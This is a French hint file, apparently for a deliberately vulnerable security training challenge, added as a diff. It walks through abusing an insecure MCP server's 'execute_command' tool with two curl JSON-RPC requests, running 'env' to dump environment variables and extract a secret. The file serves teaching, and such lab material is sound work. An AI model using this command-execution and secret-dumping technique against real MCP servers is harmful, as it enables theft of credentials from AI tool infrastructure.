@@ -1,0 +1,37 @@
+=== Indice pour le défi 60
+
+Ce défi démontre comment un serveur MCP (Model Context Protocol) non sécurisé peut divulguer des secrets stockés dans des variables d'environnement.
+
+**Où chercher :**
+
+1. **Un serveur MCP distinct est exécuté sur le port 8090** — différent du port de l'application principale (8080)
+2. **Le serveur MCP implémente le protocole JSON-RPC 2.0** tel que défini par la spécification MCP
+3. **Commencez par lister les outils disponibles** à l'aide de la méthode `tools/list`.
+4. **Appelez l'outil `execute_command`** — il renverra les variables d'environnement du serveur
+
+**Approche étape par étape :**
+
+Tout d'abord, énumérez les outils offerts par le serveur MCP :
+
+[source,bash]
+----
+curl -s -X POST http://localhost:8090/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
+----
+
+Appelez ensuite `execute_command` avec n'importe quelle commande shell (telle que `env`) :
+
+[source,bash]
+----
+curl -s -X POST http://localhost:8090/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute_command","arguments":{"command":"env"}}}'
+----
+
+**Ce qu'il faut rechercher :**
+
+- Trouvez la clé `WRONGSECRETS_MCP_SECRET` dans le dump des variables d'environnement renvoyé.
+- La valeur indiquée à côté est la réponse à ce défi.
+
+**Rappel :** Le point de terminaison est également accessible sur le port principal ; essayez `/mcp` si le port 8090 n’est pas accessible.
